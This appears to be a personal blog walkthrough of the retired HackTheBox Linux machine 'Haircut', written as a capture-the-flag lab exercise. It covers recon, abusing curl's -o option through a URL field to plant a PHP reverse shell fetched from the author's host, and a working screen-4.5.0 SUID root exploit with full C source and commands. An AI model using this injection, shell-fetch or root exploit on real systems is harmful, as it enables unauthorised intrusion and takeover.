---
title: Haircut - HackTheBox Walkthrough
date: 2021-11-08 12:00:00 
categories: [HackTheBox,Linux]
tags: [curl,suid]
img_path: /assets/img/HTB/Haircut/
image: 
  path: 00-banner.png
---
Hello guys, welcome back with another walkthrough, this time we'll be doing `Haircut` a retired linux machine from HackTheBox rated medium. Without further ado, let’s begin.
# Recon
## Nmap Scan
As always we’ll start with a nmap scan to discover the open ports and services.
```console
$cat nmap-scan
# Nmap 7.91 scan initiated Wed Nov  3 21:23:26 2021 as: nmap -sC -sV -v -oN nmap-scan 10.129.249.10
Nmap scan report for 10.129.249.10
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov  3 21:23:59 2021 -- 1 IP address (1 host up) scanned in 32.31 seconds
```
There only two ports open: `22:ssh`, `80:http`.
## HTTP Enumeration
Looks like a normal webpage, let's try bruteforcing the directories looking for anything interesting.
```console
$gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.129.249.10/ -t 100 -x txt,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.249.10/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2021/11/03 21:40:05 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 194] [--> http://10.129.249.10/uploads/]
/exposed.php          (Status: 200) [Size: 446]

===============================================================
2021/11/03 21:43:12 Finished
===============================================================
```

`/uploads` returns a 403 forbidden and on `exposed.php` has a place to enter a URL, after testing some urls seems that the page is using `curl` command

![01-web](01-web.png)
# Initial Foothold
I tried inject commands using:
- http://localhost/test.html \| id
- http://localhost/test.html ; id
- http://localhost/test.html ; $(id)

That's when I remembered about `-o` curl argument that allows write the output into a specific file.
Copy a reverse shell and change the ip and the listener port.
```console
$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```
Create a Python HTTP Server and then submit: `http://10.10.14.108/shell.php -o /var/www/html/uploads/shell.php` to save the output inside `/uploads` directory.

Visit `http://10.129.249.10/uploads/shell.php` and recieve a reverse shell on your listener port.

![02-shell](02-shell.png)

Upgrade the shell to a TTY Shell:

```console
$script /dev/null -c bash
$^Z
$nc -nlvp 443
$stty raw -echo; fg
$
$export TERM=xterm
$export SHELL=bash
$stty rows 53 columns 190
```
# Privilage Escalation
Seems `screen-4.5.0` has SUID permissions and is vulnerable to a [Local Privilege Escalation](https://www.exploit-db.com/exploits/41154) .

![03-suid](03-suid.png)

When I tried to run the exploit, it showed some errors. That's why I decided to compile both C programs on my kali machine.

The first script with the name of `libhax.c`:
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```
![04-c](04-c.png)

And the second with the name of `rootshell.c`:
```c
#include <stdio.h>
#include <stdlib.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    system("/bin/sh", NULL, NULL);
}
```
![05-c](05-c.png)

After compile both programs create a python HTTP Server and transfer both files to the victim machine.
```
wget http://10.10.14.108/libhax.so
wget http://10.10.14.108/rootshell
```
Then execute the next commands:
```console
$ cd /etc
$ umask 000
$ screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
$ screen -ls
$ /tmp/rootshell
```
Now we are root and we can read root.txt

![06-root](06-root.png)

That’s it for now guys. Until next time.

